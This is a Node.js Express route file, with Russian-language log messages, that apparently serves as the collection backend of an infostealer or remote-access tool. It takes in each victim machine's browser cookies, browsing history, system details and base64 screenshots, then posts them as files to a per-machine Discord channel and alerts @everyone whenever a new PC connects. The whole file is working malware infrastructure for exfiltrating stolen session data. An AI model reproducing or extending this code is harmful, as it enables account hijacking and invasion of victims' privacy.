import express from "express";
import { GUILD_ID, CATEGORY_BASE_PC, MAX_FILE_SIZE } from "../config.js";
import { bot } from "../discord/bot.js";
import { getOrCreateCategory, getOrCreateLogChannel, logToDiscord } from "../discord/channels.js";
import { safeChannelName, safeFileChunking } from "../utils/helpers.js";

const router = express.Router();

const onlinePCs = global.onlinePCs || (global.onlinePCs = {});
const pcData = global.pcData || (global.pcData = {});
const pendingCommands = global.pendingCommands || (global.pendingCommands = {});
const channelByPC = global.channelByPC || (global.channelByPC = {});

async function sendJsonFile(channel, nameBase, jsonData) {
    const str = JSON.stringify(jsonData, null, 2);
    if (Buffer.byteLength(str) <= MAX_FILE_SIZE) {
        await channel.send({ files: [{ attachment: Buffer.from(str), name: `${nameBase}.json` }] });
    } else {
        const chunks = safeFileChunking(str, MAX_FILE_SIZE);
        for (let i = 0; i < chunks.length; i++) {
            await channel.send({
                content: `📄 Файл ${nameBase} часть ${i + 1}/${chunks.length}`,
                files: [{ attachment: chunks[i], name: `${nameBase}-part${i + 1}.json` }]
            });
        }
    }
}

router.post("/", async (req, res) => {
    try {
        const { pcId, cookies, history, systemInfo, screenshot } = req.body;
        if (!pcId) return res.status(400).json({ error: "pcId required" });

        onlinePCs[pcId] = Date.now();
        pcData[pcId] = { cookies, history, systemInfo, screenshot };

        const guild = await bot.guilds.fetch(GUILD_ID);
        const category = await getOrCreateCategory(guild, CATEGORY_BASE_PC);
        const channelName = safeChannelName('pc', pcId);

        let finalChannel = null;
        let isNewPc = false;

        if (channelByPC[pcId]) finalChannel = await guild.channels.fetch(channelByPC[pcId]).catch(() => null);
        if (!finalChannel) {
            finalChannel = await guild.channels.create({ name: channelName, type: 0, parent: category.id });
            channelByPC[pcId] = finalChannel.id;
            isNewPc = true;
        }

        if (isNewPc) {
            const logChannel = await getOrCreateLogChannel(guild);
            await logChannel.send(`🚀 Новый ПК подключен: **${pcId}** <@everyone>`);
        }

        if (cookies) await sendJsonFile(finalChannel, `${channelName}-cookies`, cookies);
        if (history) await sendJsonFile(finalChannel, `${channelName}-history`, history);
        if (systemInfo) await sendJsonFile(finalChannel, `${channelName}-system`, systemInfo);
        if (screenshot) await finalChannel.send({ files: [{ attachment: Buffer.from(screenshot, "base64"), name: `${channelName}-screenshot.jpeg` }] });

        await finalChannel.send({ content: `🟢 ПК **${pcId}** обновлён` });

        res.json({ success: true });
    } catch (e) {
        await logToDiscord(`❌ Ошибка upload-pc: ${e.message}`);
        res.status(500).json({ error: e.message });
    }
});

export default router;
